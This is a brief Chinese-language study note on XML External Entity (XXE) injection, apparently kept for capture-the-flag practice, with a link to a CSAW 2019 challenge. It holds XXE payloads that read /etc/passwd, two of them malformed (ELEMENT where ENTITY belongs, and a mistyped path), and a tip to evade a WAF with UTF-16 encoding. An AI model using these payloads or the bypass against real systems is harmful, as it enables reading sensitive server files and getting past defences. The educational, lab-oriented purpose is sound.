XXE

XML External Entity Injection即xml外部实体注入漏洞，简称XXE漏洞。XXE是针对解析XML输入的应用程序的一种攻击。 当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。

典型的XXE攻击是由

XML声明：<?xml version="1.0"?>

DTD部分(通过特殊的命令去其他文件读取信息)

SYSTEM

XML部分组成



```
引用外部的URL 
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT xee SYSTEM "example.com">
]>
 
或者使用伪协议读文件
 
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT xee SYSTEM "file:///ect/passwd">
]>

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
<!ENTITY admin SYSTEM "file:///etc/passwd">
]>
<user><username>&admin;</username><password>123456</password></user>

```

2023/11/24

[[CSAWQual 2019\]Unagi | NSSCTF](https://www.nssctf.cn/problem/192)

脚本再d/ctf_tools

如果被WAF拦截，可用utf-16编码